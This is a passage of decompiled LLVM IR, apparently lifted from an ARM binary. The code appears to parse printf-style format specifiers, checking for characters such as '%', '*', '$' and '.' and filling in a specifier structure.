  %v3_10f58 = zext i8 %v2_10f58 to i32
  store i32 %v3_10f58, i32* %r3.global-to-local, align 4
  %v7_10f5c = icmp eq i8 %v2_10f58, 48
  br i1 %v7_10f5c, label %dec_label_pc_10f2c, label %bb147

bb147:                                            ; preds = %dec_label_pc_10f58
  %v1_10f60 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v1_10f60, i32* %fp.global-to-local, align 4
  br label %dec_label_pc_10fb4

dec_label_pc_10f6c.loopexit:                      ; preds = %dec_label_pc_10f74
  %v1_10f80 = load i32, i32* @r4, align 4
  %v3_10f80 = or i32 %v1_10f80, %v0_10f94
  store i32 %v3_10f80, i32* @r4, align 4
  %v2_10f84 = add i32 %v0_10f7876, 1
  store i32 %v2_10f84, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_10f6c

dec_label_pc_10f6c:                               ; preds = %dec_label_pc_10f6c.loopexit, %dec_label_pc_10f30
  %v0_10f7876 = phi i32 [ %v2_10f84, %dec_label_pc_10f6c.loopexit ], [ %v0_10f30, %dec_label_pc_10f30 ]
  store i32 %v3_10f6c, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  %v1_10f78 = inttoptr i32 %v0_10f7876 to i8*
  br label %dec_label_pc_10f74

dec_label_pc_10f74:                               ; preds = %dec_label_pc_10f8c, %dec_label_pc_10f6c
  %v0_10f94 = phi i32 [ %v2_10f94, %dec_label_pc_10f8c ], [ 1, %dec_label_pc_10f6c ]
  %v0_10f74 = phi i32 [ %v5_10f74, %dec_label_pc_10f8c ], [ %v3_10f6c, %dec_label_pc_10f6c ]
  %v1_10f74 = inttoptr i32 %v0_10f74 to i8*
  %v2_10f74 = load i8, i8* %v1_10f74, align 1
  %v3_10f74 = zext i8 %v2_10f74 to i32
  store i32 %v3_10f74, i32* %r2.global-to-local, align 4
  %v5_10f74 = add i32 %v0_10f74, 1
  store i32 %v5_10f74, i32* %r0.global-to-local, align 4
  %v2_10f78 = load i8, i8* %v1_10f78, align 1
  %v3_10f78 = zext i8 %v2_10f78 to i32
  store i32 %v3_10f78, i32* %r3.global-to-local, align 4
  %v9_10f7c = icmp eq i8 %v2_10f78, %v2_10f74
  br i1 %v9_10f7c, label %dec_label_pc_10f6c.loopexit, label %dec_label_pc_10f8c

dec_label_pc_10f8c:                               ; preds = %dec_label_pc_10f74
  %v1_10f8c = inttoptr i32 %v5_10f74 to i8*
  %v2_10f8c = load i8, i8* %v1_10f8c, align 1
  %v3_10f8c = zext i8 %v2_10f8c to i32
  store i32 %v3_10f8c, i32* %r3.global-to-local, align 4
  %v2_10f90 = icmp eq i8 %v2_10f8c, 0
  %v2_10f94 = mul i32 %v0_10f94, 2
  store i32 %v2_10f94, i32* %r1.global-to-local, align 4
  br i1 %v2_10f90, label %dec_label_pc_10f9c, label %dec_label_pc_10f74

dec_label_pc_10f9c:                               ; preds = %dec_label_pc_10f8c
  %v1_10f9c = add i32 %v0_10f7876, -1
  %v2_10f9c = inttoptr i32 %v1_10f9c to i8*
  %v3_10f9c = load i8, i8* %v2_10f9c, align 1
  %v7_10fa0 = icmp eq i8 %v3_10f9c, 37
  %v0_10fa4 = load i32, i32* @r4, align 4
  %v1_10fa4 = and i32 %v0_10fa4, 10
  store i32 %v1_10fa4, i32* %r3.global-to-local, align 4
  %v4_10fa8 = udiv i32 %v1_10fa4, 2
  %v5_10fa8 = sub nuw nsw i32 -1, %v4_10fa8
  %v6_10fa8 = and i32 %v0_10fa4, %v5_10fa8
  store i32 %v6_10fa8, i32* @r4, align 4
  br i1 %v7_10fa0, label %dec_label_pc_10fb0, label %dec_label_pc_10e68

dec_label_pc_10fb0:                               ; preds = %dec_label_pc_10f9c
  %v0_10fb0 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_10fb0, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_10fb4

dec_label_pc_10fb4:                               ; preds = %bb147, %dec_label_pc_10ee8, %dec_label_pc_10f44, %dec_label_pc_10fb0
  %v1_10ff4 = phi i32 [ %v0_10f7876, %dec_label_pc_10fb0 ], [ %v0_10f50, %bb147 ], [ %v0_10f50, %dec_label_pc_10f44 ], [ %v0_10f50, %dec_label_pc_10ee8 ]
  %v0_10ff0 = phi i32 [ %v5_10f74, %dec_label_pc_10fb0 ], [ %v0_10ee8, %bb147 ], [ %v0_10ee8, %dec_label_pc_10f44 ], [ %v0_10ee8, %dec_label_pc_10ee8 ]
  %stack_var_-44.3 = phi i32 [ %stack_var_-44.2, %dec_label_pc_10fb0 ], [ %stack_var_-44.1, %bb147 ], [ %stack_var_-44.1, %dec_label_pc_10f44 ], [ %stack_var_-44.1, %dec_label_pc_10ee8 ]
  %v1_10fb4 = inttoptr i32 %v0_10ff0 to i8*
  %v2_10fb4 = load i8, i8* %v1_10fb4, align 1
  %v3_10fb4 = zext i8 %v2_10fb4 to i32
  store i32 %v3_10fb4, i32* %r3.global-to-local, align 4
  %v7_10fb8 = icmp eq i8 %v2_10fb4, 42
  br i1 %v7_10fb8, label %dec_label_pc_10fc0, label %dec_label_pc_11000

dec_label_pc_10fc0:                               ; preds = %dec_label_pc_10fb4
  %v0_10fc0 = load i32, i32* %fp.global-to-local, align 4
  %v2_10fc0 = icmp eq i32 %v0_10fc0, 0
  br i1 %v2_10fc0, label %dec_label_pc_10ff0, label %dec_label_pc_10fc8

dec_label_pc_10fc8:                               ; preds = %dec_label_pc_10fc0
  %v1_10fc8 = inttoptr i32 %v1_10ff4 to i8*
  %v2_10fc8 = load i8, i8* %v1_10fc8, align 1
  %v3_10fc8 = zext i8 %v2_10fc8 to i32
  store i32 %v3_10fc8, i32* %r3.global-to-local, align 4
  %v7_10fcc = icmp eq i8 %v2_10fc8, 36
  br i1 %v7_10fcc, label %dec_label_pc_10fd4, label %dec_label_pc_112e8

dec_label_pc_10fd4:                               ; preds = %dec_label_pc_10fc8
  %v0_10fd4 = load i32, i32* %r1.global-to-local, align 4
  %tmp148 = icmp slt i32 %v0_10fd4, 1
  br i1 %tmp148, label %dec_label_pc_112e8, label %dec_label_pc_10fdc

dec_label_pc_10fdc:                               ; preds = %dec_label_pc_10fd4
  %v0_10fe0 = load i32, i32* %r8.global-to-local, align 4
  %v1_10fe0 = load i32, i32* %sb.global-to-local, align 4
  %v3_10fe0 = mul i32 %v1_10fe0, %v0_10fe0
  %v4_10fe0 = add i32 %v3_10fe0, %v3_10e74.pre-phi
  store i32 %v4_10fe0, i32* %r3.global-to-local, align 4
  %v1_10fe4 = add i32 %v1_10ff4, 1
  store i32 %v1_10fe4, i32* %r6.global-to-local, align 4
  %v2_10fe8 = add i32 %v4_10fe0, -12
  %v3_10fe8 = inttoptr i32 %v2_10fe8 to i32*
  store i32 %v0_10fd4, i32* %v3_10fe8, align 4
  br label %dec_label_pc_10ffc

dec_label_pc_10ff0:                               ; preds = %dec_label_pc_10fc0
  %v1_10ff0 = add i32 %v0_10ff0, 1
  store i32 %v1_10ff0, i32* %r3.global-to-local, align 4
  %v9_10ff4 = icmp eq i32 %v1_10ff0, %v1_10ff4
  br i1 %v9_10ff4, label %dec_label_pc_10ffc, label %dec_label_pc_112e8

dec_label_pc_10ffc:                               ; preds = %dec_label_pc_10ff0, %dec_label_pc_10fdc
  store i32 -2147483648, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_11000

dec_label_pc_11000:                               ; preds = %dec_label_pc_10fb4, %dec_label_pc_10ffc
  %v0_11000 = load i32, i32* %r8.global-to-local, align 4
  %v2_11000 = icmp eq i32 %v0_11000, 0
  br i1 %v2_11000, label %dec_label_pc_1100c, label %dec_label_pc_1102c.loopexit

dec_label_pc_1100c:                               ; preds = %dec_label_pc_11000
  %v0_1100c = load i32, i32* %r6.global-to-local, align 4
  %v1_1100c = inttoptr i32 %v0_1100c to i8*
  %v2_1100c = load i8, i8* %v1_1100c, align 1
  %v3_1100c = zext i8 %v2_1100c to i32
  store i32 %v3_1100c, i32* %r3.global-to-local, align 4
  %v7_11010 = icmp eq i8 %v2_1100c, 46
  br i1 %v7_11010, label %.thread20, label %dec_label_pc_11024

.thread20:                                        ; preds = %dec_label_pc_1100c
  %v2_11014 = add i32 %v0_1100c, 1
  store i32 %v2_11014, i32* %r6.global-to-local, align 4
  %v1_11018 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v1_11018, i32* %sl.global-to-local, align 4
  store i32 -1, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_10e68

dec_label_pc_11024:                               ; preds = %dec_label_pc_1100c
  %v0_11024 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v0_11024, i32* %sl.global-to-local, align 4
  store i32 -1, i32* @r5, align 4
  br label %dec_label_pc_1102c

dec_label_pc_1102c.loopexit:                      ; preds = %dec_label_pc_11000
  %v1_11004 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v1_11004, i32* @r5, align 4
  %v0_11038.pre.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_1102c

dec_label_pc_1102c:                               ; preds = %dec_label_pc_1102c.loopexit, %dec_label_pc_11024
  %v0_11038.pre = phi i32 [ %v0_11038.pre.pre, %dec_label_pc_1102c.loopexit ], [ %v0_1100c, %dec_label_pc_11024 ]
  store i32 -37024, i32* %r3.global-to-local, align 4
  %v0_11030 = load i32, i32* @lr, align 4
  %v2_11030 = add i32 %v0_11030, -37024
  store i32 %v2_11030, i32* %r1.global-to-local, align 4
  %v1_11038 = inttoptr i32 %v0_11038.pre to i8*
  br label %dec_label_pc_11034

dec_label_pc_11034:                               ; preds = %dec_label_pc_11048, %dec_label_pc_1102c
  %v0_11048 = phi i32 [ %v1_11048, %dec_label_pc_11048 ], [ %v2_11030, %dec_label_pc_1102c ]
  %v1_11034 = inttoptr i32 %v0_11048 to i8*
  %v2_11034 = load i8, i8* %v1_11034, align 1
  %v3_11034 = zext i8 %v2_11034 to i32
  store i32 %v3_11034, i32* %r2.global-to-local, align 4
  %v2_11038 = load i8, i8* %v1_11038, align 1
  %v3_11038 = zext i8 %v2_11038 to i32
  store i32 %v3_11038, i32* %r3.global-to-local, align 4
  %v9_1103c = icmp eq i8 %v2_11038, %v2_11034
  br i1 %v9_1103c, label %bb149, label %dec_label_pc_11048

bb149:                                            ; preds = %dec_label_pc_11034
  %v2_11040 = add i32 %v0_11038.pre, 1
  store i32 %v2_11040, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_11054

dec_label_pc_11048:                               ; preds = %dec_label_pc_11034
  %v1_11048 = add i32 %v0_11048, 1
  %v2_11048 = inttoptr i32 %v1_11048 to i8*
  %v3_11048 = load i8, i8* %v2_11048, align 1
  %v4_11048 = zext i8 %v3_11048 to i32
  store i32 %v4_11048, i32* %r3.global-to-local, align 4
  store i32 %v1_11048, i32* %r1.global-to-local, align 4
  %v2_1104c = icmp eq i8 %v3_11048, 0
  br i1 %v2_1104c, label %dec_label_pc_11054, label %dec_label_pc_11034

dec_label_pc_11054:                               ; preds = %dec_label_pc_11048, %bb149
  %v1_11078 = phi i32 [ %v2_11040, %bb149 ], [ %v0_11038.pre, %dec_label_pc_11048 ]
  %v1_11074 = phi i32 [ %v0_11048, %bb149 ], [ %v1_11048, %dec_label_pc_11048 ]
  %v2_1105c = sub i32 %v1_11074, %v2_11030
  store i32 %v2_1105c, i32* %r3.global-to-local, align 4
  %v8_11064 = icmp sgt i32 %v2_1105c, 1
  br i1 %v8_11064, label %.thread24, label %dec_label_pc_11068

dec_label_pc_11068:                               ; preds = %dec_label_pc_11054
  %v1_11068 = inttoptr i32 %v1_11078 to i8*
  %v2_11068 = load i8, i8* %v1_11068, align 1
  %v3_11068 = zext i8 %v2_11068 to i32
  store i32 %v3_11068, i32* %r2.global-to-local, align 4
  %v1_1106c = inttoptr i32 %v1_11074 to i8*
  %v2_1106c = load i8, i8* %v1_1106c, align 1
  %v3_1106c = zext i8 %v2_1106c to i32
  store i32 %v3_1106c, i32* %r3.global-to-local, align 4
  %v9_11070 = icmp eq i8 %v2_11068, %v2_1106c
  br i1 %v9_11070, label %bb150, label %.thread24

bb150:                                            ; preds = %dec_label_pc_11068
  %v2_11074 = add i32 %v1_11074, 9
  store i32 %v2_11074, i32* %r1.global-to-local, align 4
  %v2_11078 = add i32 %v1_11078, 1
  store i32 %v2_11078, i32* %r6.global-to-local, align 4
  br label %.thread24

.thread24:                                        ; preds = %dec_label_pc_11068, %dec_label_pc_11054, %bb150
  %v0_11080 = phi i32 [ %v1_11074, %dec_label_pc_11068 ], [ %v1_11074, %dec_label_pc_11054 ], [ %v2_11074, %bb150 ]
  %v0_1107c = phi i32 [ %v1_11078, %dec_label_pc_11068 ], [ %v1_11078, %dec_label_pc_11054 ], [ %v2_11078, %bb150 ]
  %v1_1107c = inttoptr i32 %v0_1107c to i8*
  %v2_1107c = load i8, i8* %v1_1107c, align 1
  %v3_1107c = zext i8 %v2_1107c to i32
  store i32 %v3_1107c, i32* %r2.global-to-local, align 4
  %v1_11080 = add i32 %v0_11080, 9
  %v2_11080 = inttoptr i32 %v1_11080 to i8*
  %v3_11080 = load i8, i8* %v2_11080, align 1
  %v4_11080 = zext i8 %v3_11080 to i32
  store i32 %v4_11080, i32* %r3.global-to-local, align 4
  %v2_11084 = icmp eq i8 %v2_1107c, 0
  %v3_11088 = mul nuw nsw i32 %v4_11080, 256
  store i32 %v3_11088, i32* @ip, align 4
  br i1 %v2_11084, label %dec_label_pc_112e8, label %dec_label_pc_11090

dec_label_pc_11090:                               ; preds = %.thread24
  store i32 -36924, i32* %r3.global-to-local, align 4
  %v2_11094 = add i32 %v0_11030, -36924
  store i32 %v2_11094, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_11098

dec_label_pc_11098:                               ; preds = %dec_label_pc_1111c, %dec_label_pc_11090
  %v1_110ac = phi i32 [ %v1_1111c, %dec_label_pc_1111c ], [ %v2_11094, %dec_label_pc_11090 ]
  %v1_11098 = inttoptr i32 %v1_110ac to i8*
  %v2_11098 = load i8, i8* %v1_11098, align 1
  %v3_11098 = zext i8 %v2_11098 to i32
  store i32 %v3_11098, i32* %r3.global-to-local, align 4
  %v9_1109c = icmp eq i8 %v2_11098, %v2_1107c
  br i1 %v9_1109c, label %dec_label_pc_110a4, label %dec_label_pc_1111c

dec_label_pc_110a4:                               ; preds = %dec_label_pc_11098
  store i32 %v2_11094, i32* %r3.global-to-local, align 4
  %v2_110ac = sub i32 %v1_110ac, %v2_11094
  store i32 %v2_110ac, i32* %r1.global-to-local, align 4
  %v7_110b4 = icmp slt i32 %v2_110ac, 18
  br i1 %v7_110b4, label %bb152, label %dec_label_pc_110b8

dec_label_pc_110b8:                               ; preds = %dec_label_pc_110a4
  %v1_110b8 = and i32 %v3_11088, 1024
  %v2_110b8 = icmp eq i32 %v1_110b8, 0
  br i1 %v2_110b8, label %bb152, label %bb151

bb151:                                            ; preds = %dec_label_pc_110b8
  %v2_110bc = add i32 %v2_110ac, -2
  store i32 %v2_110bc, i32* %r1.global-to-local, align 4
  br label %bb152

bb152:                                            ; preds = %dec_label_pc_110a4, %dec_label_pc_110b8, %bb151
  %v0_110c4 = phi i32 [ %v2_110ac, %dec_label_pc_110a4 ], [ %v2_110ac, %dec_label_pc_110b8 ], [ %v2_110bc, %bb151 ]
  store i32 -36972, i32* %r3.global-to-local, align 4
  %v1_110c4 = load i32, i32* %r7.global-to-local, align 4
  %v2_110c4 = add i32 %v1_110c4, 32
  %v3_110c4 = inttoptr i32 %v2_110c4 to i32*
  store i32 %v0_110c4, i32* %v3_110c4, align 4
  %v0_110c8 = load i32, i32* @lr, align 4
  %v1_110c8 = load i32, i32* %r3.global-to-local, align 4
  %v2_110c8 = add i32 %v1_110c8, %v0_110c8
  store i32 %v2_110c8, i32* %r3.global-to-local, align 4
  %v1_110cc = add i32 %v2_110c8, -1
  store i32 %v1_110cc, i32* %r0.global-to-local, align 4
  %v0_110d4.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_110d0

dec_label_pc_110d0:                               ; preds = %dec_label_pc_110d0, %bb152
  %v0_110d0 = phi i32 [ %v1_110d0, %dec_label_pc_110d0 ], [ %v1_110cc, %bb152 ]
  %v1_110d0 = add i32 %v0_110d0, 1
  %v2_110d0 = inttoptr i32 %v1_110d0 to i8*
  %v3_110d0 = load i8, i8* %v2_110d0, align 1
  %v4_110d0 = zext i8 %v3_110d0 to i32
  store i32 %v4_110d0, i32* %r3.global-to-local, align 4
  store i32 %v1_110d0, i32* %r0.global-to-local, align 4
  %v8_110d8 = icmp sgt i32 %v0_110d4.pre, %v4_110d0
  br i1 %v8_110d8, label %dec_label_pc_110d0, label %dec_label_pc_110dc

dec_label_pc_110dc:                               ; preds = %dec_label_pc_110d0
  %v2_110e4.neg = sub i32 36972, %v0_110c8
  %v2_110e8 = add i32 %v2_110e4.neg, %v1_110d0
  %v2_110ec = mul i32 %v2_110e8, 2
  store i32 %v2_110ec, i32* %r2.global-to-local, align 4
  %v2_110f0 = add i32 %v0_110c8, -36988
  store i32 %v2_110f0, i32* %r3.global-to-local, align 4
  %v2_110f4 = add i32 %v2_110ec, %v2_110f0
  %v3_110f4 = inttoptr i32 %v2_110f4 to i16*
  %v4_110f4 = load i16, i16* %v3_110f4, align 2
  %v6_110f4 = sext i16 %v4_110f4 to i32
  store i32 %v6_110f4, i32* %r1.global-to-local, align 4
  %v2_110fc = add i32 %v0_110c8, -37004
  store i32 %v2_110fc, i32* %r3.global-to-local, align 4
  %v2_11100 = add i32 %v2_110ec, %v2_110fc
  %v3_11100 = inttoptr i32 %v2_11100 to i16*
  %v4_11100 = load i16, i16* %v3_11100, align 2
  %v6_11100 = sext i16 %v4_11100 to i32
  %v1_11104 = load i32, i32* @ip, align 4
  %v2_11104 = or i32 %v1_11104, %v6_110f4
  %v2_11108 = and i32 %v2_11104, %v6_11100
  store i32 %v2_11108, i32* %r1.global-to-local, align 4
  store i32 -36924, i32* %r3.global-to-local, align 4
  %v2_11110 = add i32 %v0_110c8, -36924
  store i32 %v2_11110, i32* %r0.global-to-local, align 4
  store i32 %v2_11108, i32* %stack_var_-72, align 4
  %v0_11134.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_11128

dec_label_pc_1111c:                               ; preds = %dec_label_pc_11098
  %v1_1111c = add i32 %v1_110ac, 1
  %v2_1111c = inttoptr i32 %v1_1111c to i8*
  %v3_1111c = load i8, i8* %v2_1111c, align 1
  %v4_1111c = zext i8 %v3_1111c to i32
  store i32 %v4_1111c, i32* %r3.global-to-local, align 4
  store i32 %v1_1111c, i32* %r0.global-to-local, align 4
  %v2_11120 = icmp eq i8 %v3_1111c, 0
  br i1 %v2_11120, label %dec_label_pc_11128, label %dec_label_pc_11098

dec_label_pc_11128:                               ; preds = %dec_label_pc_1111c, %dec_label_pc_110dc
  %v0_11134 = phi i32 [ %v0_11134.pre, %dec_label_pc_110dc ], [ %v0_1107c, %dec_label_pc_1111c ]
  %v0_11130 = phi i32 [ %v1_11104, %dec_label_pc_110dc ], [ %v3_11088, %dec_label_pc_1111c ]
  %v0_11128 = load i32, i32* @r4, align 4
  %v1_11128 = and i32 %v0_11128, 4
  %v1_1112c = and i32 %v0_11128, -5
  store i32 %v1_1112c, i32* %r3.global-to-local, align 4
  %v1_11130 = and i32 %v0_11130, 3840
  store i32 %v1_11130, i32* %r2.global-to-local, align 4
  %v1_11134 = inttoptr i32 %v0_11134 to i8*
  %v2_11134 = load i8, i8* %v1_11134, align 1
  %v3_11134 = zext i8 %v2_11134 to i32
  store i32 %v3_11134, i32* %r1.global-to-local, align 4
  %v2_11138 = or i32 %v1_1112c, %v1_11130
  store i32 %v2_11138, i32* %r2.global-to-local, align 4
  %tmp180 = mul nuw nsw i32 %v1_11128, 4
  %tmp181 = or i32 %tmp180, 32
  %v1_11144 = load i32, i32* %r7.global-to-local, align 4
  %v2_11144 = add i32 %v1_11144, 20
  %v3_11144 = inttoptr i32 %v2_11144 to i32*
  store i32 %tmp181, i32* %v3_11144, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_1114c = load i32, i32* %r1.global-to-local, align 4
  %v1_1114c = load i32, i32* %r7.global-to-local, align 4
  %v2_1114c = add i32 %v1_1114c, 12
  %v3_1114c = inttoptr i32 %v2_1114c to i32*
  store i32 %v0_1114c, i32* %v3_1114c, align 4
  %v0_11150 = load i32, i32* %r7.global-to-local, align 4
  %v1_11150 = add i32 %v0_11150, 4
  %v2_11150 = inttoptr i32 %v1_11150 to i32*
  %v3_11150 = load i32, i32* @r5, align 4
  store i32 %v3_11150, i32* %v2_11150, align 4
  %v4_11150 = add i32 %v0_11150, 8
  %v5_11150 = inttoptr i32 %v4_11150 to i32*
  %v6_11150 = load i32, i32* %sl.global-to-local, align 4
  store i32 %v6_11150, i32* %v5_11150, align 4
  %v0_11154 = load i32, i32* %r2.global-to-local, align 4
  %v1_11154 = load i32, i32* %r7.global-to-local, align 4
  %v2_11154 = add i32 %v1_11154, 16
  %v3_11154 = inttoptr i32 %v2_11154 to i32*
  store i32 %v0_11154, i32* %v3_11154, align 4
  %v0_11158 = load i32, i32* %r3.global-to-local, align 4
  %v1_11158 = load i32, i32* %r7.global-to-local, align 4
  %v2_11158 = add i32 %v1_11158, 28
  %v3_11158 = inttoptr i32 %v2_11158 to i32*
  store i32 %v0_11158, i32* %v3_11158, align 4
  %v0_1115c = load i32, i32* %r0.global-to-local, align 4
  %v1_1115c = inttoptr i32 %v0_1115c to i8*
  %v2_1115c = load i8, i8* %v1_1115c, align 1
  %v3_1115c = zext i8 %v2_1115c to i32
  store i32 %v3_1115c, i32* %r2.global-to-local, align 4
  %v2_11160 = icmp eq i8 %v2_1115c, 0
  br i1 %v2_11160, label %dec_label_pc_11168, label %dec_label_pc_111ec

dec_label_pc_11168:                               ; preds = %dec_label_pc_11128
  %v0_11168 = load i32, i32* %r6.global-to-local, align 4
  %v1_11168 = inttoptr i32 %v0_11168 to i8*
  %v2_11168 = load i8, i8* %v1_11168, align 1
  %v3_11168 = zext i8 %v2_11168 to i32
  store i32 %v3_11168, i32* %r3.global-to-local, align 4
  %v7_1116c = icmp eq i8 %v2_11168, 109
  br i1 %v7_1116c, label %.thread28, label %dec_label_pc_11180

.thread28:                                        ; preds = %dec_label_pc_11168
  store i32 20, i32* %r3.global-to-local, align 4
  %v2_11174 = load i32, i32* %r7.global-to-local, align 4
  %v3_11174 = add i32 %v2_11174, 32
  %v4_11174 = inttoptr i32 %v3_11174 to i32*
  store i32 20, i32* %v4_11174, align 4
  %v1_11178 = load i32, i32* %r2.global-to-local, align 4
  %v2_11178 = load i32, i32* %r7.global-to-local, align 4
  %v3_11178 = add i32 %v2_11178, 28
  %v4_11178 = inttoptr i32 %v3_11178 to i32*
  store i32 %v1_11178, i32* %v4_11178, align 4
  br label %dec_label_pc_111ec

dec_label_pc_11180:                               ; preds = %dec_label_pc_11168
  store i32 3856, i32* %r3.global-to-local, align 4
  %v0_11184 = load i32, i32* @lr, align 4
  %v2_11184 = add i32 %v0_11184, 3856
  %v3_11184 = inttoptr i32 %v2_11184 to i32*
  %v4_11184 = load i32, i32* %v3_11184, align 4
  store i32 %v4_11184, i32* %r1.global-to-local, align 4
  store i32 21, i32* %r3.global-to-local, align 4
  %v1_1118c = load i32, i32* %r7.global-to-local, align 4
  %v2_1118c = add i32 %v1_1118c, 32
  %v3_1118c = inttoptr i32 %v2_1118c to i32*
  store i32 21, i32* %v3_1118c, align 4
  %v0_11190 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v0_11190, i32* @ip, align 4
  %v1_11194 = add i32 %v0_11190, 10
  store i32 %v1_11194, i32* %r0.global-to-local, align 4
  %v0_1119c.pre = load i32, i32* %r6.global-to-local, align 4
  %v1_1119c = inttoptr i32 %v0_1119c.pre to i8*
  br label %dec_label_pc_11198

dec_label_pc_11198:                               ; preds = %dec_label_pc_111dc, %dec_label_pc_11180
  %v1_111a8 = phi i32 [ %v1_111dc, %dec_label_pc_111dc ], [ %v0_11190, %dec_label_pc_11180 ]
  %v1_11198 = inttoptr i32 %v1_111a8 to i8*
  %v2_11198 = load i8, i8* %v1_11198, align 1
  %v3_11198 = zext i8 %v2_11198 to i32
  store i32 %v3_11198, i32* %r2.global-to-local, align 4
  %v2_1119c = load i8, i8* %v1_1119c, align 1
  %v3_1119c = zext i8 %v2_1119c to i32
  store i32 %v3_1119c, i32* %r3.global-to-local, align 4
  %v9_111a0 = icmp eq i8 %v2_11198, %v2_1119c
  br i1 %v9_111a0, label %dec_label_pc_111a8, label %dec_label_pc_111dc

dec_label_pc_111a8:                               ; preds = %dec_label_pc_11198
  %v2_111a8 = sub i32 %v1_111a8, %v0_11190
  store i32 %v2_111a8, i32* %r3.global-to-local, align 4
  %v0_111b0 = load i32, i32* %r7.global-to-local, align 4
  %v1_111b0 = add i32 %v0_111b0, 4
  store i32 %v1_111b0, i32* %r0.global-to-local, align 4
  %v0_111b4 = load i32, i32* @lr, align 4
  %v2_111b4 = add i32 %v0_111b4, 29368
  store i32 5, i32* %r1.global-to-local, align 4
  %v2_111bc = ptrtoint i32* %stack_var_-72 to i32
  store i32 %v2_111bc, i32* %r2.global-to-local, align 4
  %v4_111c0 = mul i32 %v2_111a8, 4
  %v5_111c0 = add i32 %v2_111b4, %v4_111c0
  %v6_111c0 = inttoptr i32 %v5_111c0 to i32*
  %v7_111c0 = load i32, i32* %v6_111c0, align 4
  store i32 %v7_111c0, i32* @ip, align 4
  store i32 70092, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v7_111c0)
  %v0_111cc = load i32, i32* %r0.global-to-local, align 4
  %v1_111d0 = load i32, i32* %r7.global-to-local, align 4
  %v2_111d0 = add i32 %v1_111d0, 28
  %v3_111d0 = inttoptr i32 %v2_111d0 to i32*
  store i32 %v0_111cc, i32* %v3_111d0, align 4
  %v7_111d4 = icmp sgt i32 %v0_111cc, 5
  br i1 %v7_111d4, label %dec_label_pc_112e8, label %dec_label_pc_111ec

dec_label_pc_111dc:                               ; preds = %dec_label_pc_11198
  %v1_111dc = add i32 %v1_111a8, 1
  store i32 %v1_111dc, i32* %r1.global-to-local, align 4
  %v3_111e0 = icmp ult i32 %v1_111dc, %v1_11194
  br i1 %v3_111e0, label %dec_label_pc_11198, label %dec_label_pc_112e8

dec_label_pc_111ec:                               ; preds = %.thread28, %dec_label_pc_111a8, %dec_label_pc_11128
  %v0_111ec = load i32, i32* %fp.global-to-local, align 4
  %tmp156 = icmp slt i32 %v0_111ec, 1
  br i1 %tmp156, label %dec_label_pc_11298, label %dec_label_pc_111f4

dec_label_pc_111f4:                               ; preds = %dec_label_pc_111ec
  store i32 0, i32* %r8.global-to-local, align 4
  %v9_1120c = add i32 %stack_var_-44.3, -2
  br label %dec_label_pc_111f8

dec_label_pc_111f8:                               ; preds = %dec_label_pc_11280, %dec_label_pc_111f4
  %v9_11218 = phi i32 [ 0, %dec_label_pc_111f4 ], [ %v1_11284, %dec_label_pc_11280 ]
  %v7_111fc = icmp sgt i32 %v9_11218, 2
  br i1 %v7_111fc, label %.thread38, label %bb157

.thread38:                                        ; preds = %dec_label_pc_111f8
  store i32 %v9_1120c, i32* %r3.global-to-local, align 4
  %v10_11218 = add i32 %v9_11218, %v9_1120c
  store i32 %v10_11218, i32* %r1.global-to-local, align 4
  br label %bb158

bb157:                                            ; preds = %dec_label_pc_111f8
  store i32 %v3_10e74.pre-phi, i32* @ip, align 4
  %v12_11200 = mul i32 %v9_11218, 4
  %v13_11200 = add i32 %v12_11200, %v3_10e74.pre-phi
  store i32 %v13_11200, i32* %r3.global-to-local, align 4
  %v9_11208 = add i32 %v13_11200, -12
  %v10_11208 = inttoptr i32 %v9_11208 to i8*
  %v11_11208 = load i8, i8* %v10_11208, align 4
  %v12_11208 = zext i8 %v11_11208 to i32
  store i32 %v12_11208, i32* %r2.global-to-local, align 4
  %v9_11210 = load i32, i32* %r7.global-to-local, align 4
  %v10_11210 = add i32 %v9_11210, %v9_11218
  store i32 %v10_11210, i32* %r3.global-to-local, align 4
  store i32 %v12_11208, i32* %r1.global-to-local, align 4
  %v11_1121c = add i32 %v10_11210, 36
  %v12_1121c = inttoptr i32 %v11_1121c to i8*
  store i8 %v11_11208, i8* %v12_1121c, align 1
  %v0_11220.pre = load i32, i32* %r1.global-to-local, align 4
  br label %bb158

bb158:                                            ; preds = %.thread38, %bb157
  %v0_11240 = phi i32 [ %v10_11218, %.thread38 ], [ %v0_11220.pre, %bb157 ]
  %v1_11220 = load i32, i32* %fp.global-to-local, align 4
  %v2_11220 = sub i32 %v0_11240, %v1_11220
  %v4_11220 = xor i32 %v1_11220, %v0_11240
  %v5_11220 = xor i32 %v2_11220, %v0_11240
  %v6_11220 = and i32 %v5_11220, %v4_11220
  %v7_11220 = icmp slt i32 %v6_11220, 0
  %v8_11220 = icmp slt i32 %v2_11220, 0
  %v9_11220 = icmp eq i32 %v0_11240, %v1_11220
  %v3_11224 = xor i1 %v8_11220, %v7_11220
  %v4_11224 = or i1 %v9_11220, %v3_11224
  br i1 %v4_11224, label %dec_label_pc_11234, label %dec_label_pc_11228

dec_label_pc_11228:                               ; preds = %bb158
  %v1_11228 = add i32 %v0_11240, -9
  %v3_11228 = sub i32 8, %v0_11240
  %v4_11228 = and i32 %v3_11228, %v0_11240
  %v5_11228 = icmp slt i32 %v4_11228, 0
  %v6_11228 = icmp slt i32 %v1_11228, 0
  %v7_11228 = icmp eq i32 %v0_11240, 9
  %v3_1122c = xor i1 %v6_11228, %v5_11228
  %v4_1122c = or i1 %v7_11228, %v3_1122c
  br i1 %v4_1122c, label %dec_label_pc_11230, label %dec_label_pc_112e8

dec_label_pc_11230:                               ; preds = %dec_label_pc_11228
